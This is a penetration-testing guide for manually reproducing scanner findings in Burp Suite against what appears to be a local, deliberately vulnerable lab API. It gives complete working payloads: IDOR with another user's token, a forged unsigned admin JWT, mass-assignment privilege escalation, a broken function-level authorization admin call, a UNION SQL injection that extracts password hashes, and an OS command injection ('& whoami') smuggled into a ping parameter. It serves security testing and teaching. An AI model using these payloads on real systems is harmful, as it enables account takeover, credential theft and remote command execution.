# Burp Suite Manual Validation & VAPT Workflow Guide

This guide walks through configuring **Burp Suite** to intercept, replay, and manually validate the vulnerabilities detected by the **Automated VAPT Scanner Framework**.

---

## 1. Routing Automated Scanner Traffic Through Burp Suite

The VAPT Framework features built-in upstream proxy support. To capture all automated scan requests in Burp Suite:

1. Open **Burp Suite** and verify the proxy listener is active on `127.0.0.1:8080` (under **Proxy** > **Proxy settings** > **Proxy listeners**).
2. Execute the automated scanner with the `--proxy` argument:
   ```powershell
   python vapt_cli.py --proxy http://127.0.0.1:8080
   ```
3. In Burp Suite, open the **HTTP history** tab under **Proxy**. You will see every automated probe, payload, and authentication token being generated and inspected in real time.

---

## 2. Step-by-Step Manual Vulnerability Reproduction in Burp Suite

### 1. BOLA / IDOR (Broken Object Level Authorization - OWASP API1)
- **Objective:** Access Alice's confidential documents using Bob's JWT token.
- **Burp Steps:**
  1. Under **Proxy** > **HTTP history**, locate the `POST /api/v1/auth/login` for user `bob` and copy Bob's JWT token.
  2. Send a request to `GET /api/v1/documents/1` to **Burp Repeater** (`Ctrl+R`).
  3. Replace the `Authorization` header with Bob's token:
     ```http
     GET /api/v1/documents/1 HTTP/1.1
     Host: 127.0.0.1:5000
     Authorization: Bearer <Bob's_JWT_Token>
     ```
  4. Click **Send**.
  5. **Expected Finding:** HTTP `200 OK` is returned, disclosing Alice's confidential M&A strategy document.

---

### 2. Broken Authentication - JWT `alg: none` Bypass (OWASP API2)
- **Objective:** Forge an administrator token without knowing the HMAC secret.
- **Burp Steps:**
  1. In Burp Repeater, prepare the following base64url-encoded parts:
     - Header: `{"alg":"none","typ":"JWT"}` -> `eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0`
     - Payload: `{"sub":"4","user_id":4,"username":"admin","role":"admin","is_admin":true}` -> `eyJzdWIiOiI0IiwidXNlcl9pZCI6NCwidXNlcm5hbWUiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiIsImlzX2FkbWluIjp0cnVlfQ`
  2. Combine them with a trailing period and empty signature:
     `eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiI0IiwidXNlcl9pZCI6NCwidXNlcm5hbWUiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiIsImlzX2FkbWluIjp0cnVlfQ.`
  3. Send request in Repeater:
     ```http
     GET /api/v1/documents/1 HTTP/1.1
     Host: 127.0.0.1:5000
     Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiI0IiwidXNlcl9pZCI6NCwidXNlcm5hbWUiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiIsImlzX2FkbWluIjp0cnVlfQ.
     ```
  4. **Expected Finding:** Server accepts unsigned token and returns HTTP `200 OK`.

---

### 3. Mass Assignment / Privilege Escalation (OWASP API3)
- **Objective:** Elevate Bob's privileges and credit balance by injecting unvalidated parameters.
- **Burp Steps:**
  1. In Repeater, prepare a `PUT` request to `/api/v1/users/2/profile`:
     ```http
     PUT /api/v1/users/2/profile HTTP/1.1
     Host: 127.0.0.1:5000
     Authorization: Bearer <Bob's_Token>
     Content-Type: application/json

     {
       "email": "bob@enterprise-corp.local",
       "role": "admin",
       "is_admin": true,
       "credit_balance": 999999.0
     }
     ```
  2. Click **Send**.
  3. **Expected Finding:** HTTP `200 OK` confirming `role: "admin"` and `credit_balance: 999999.0` were successfully assigned.

---

### 4. Broken Function Level Authorization (BFLA - OWASP API5)
- **Objective:** Invoke administrative endpoints using a low-privilege user account.
- **Burp Steps:**
  1. In Repeater:
     ```http
     GET /api/v1/admin/users HTTP/1.1
     Host: 127.0.0.1:5000
     Authorization: Bearer <Bob's_Standard_User_Token>
     ```
  2. Click **Send**.
  3. **Expected Finding:** Server returns HTTP `200 OK` with the complete list of system users and password hashes.

---

### 5. SQL Injection via UNION Attack (OWASP API / CWE-89)
- **Objective:** Extract user credentials through the product search query parameter.
- **Burp Steps:**
  1. In Repeater:
     ```http
     GET /api/v1/products/search?q='%20UNION%20SELECT%20id,%20username,%20password_hash,%20role,%20email,%20is_admin%20FROM%20users%20-- HTTP/1.1
     Host: 127.0.0.1:5000
     ```
  2. Click **Send**.
  3. **Expected Finding:** Products list returns user accounts (`alice`, `bob`, `admin`) and SHA-256 password hashes.

---

### 6. OS Command Injection (CWE-78)
- **Objective:** Execute operating system commands through the diagnostics ping endpoint.
- **Burp Steps:**
  1. In Repeater:
     ```http
     GET /api/v1/tools/ping?host=127.0.0.1%20%26%20whoami HTTP/1.1
     Host: 127.0.0.1:5000
     ```
  2. Click **Send**.
  3. **Expected Finding:** HTTP `200 OK` containing the output of `whoami` (current operating system user).
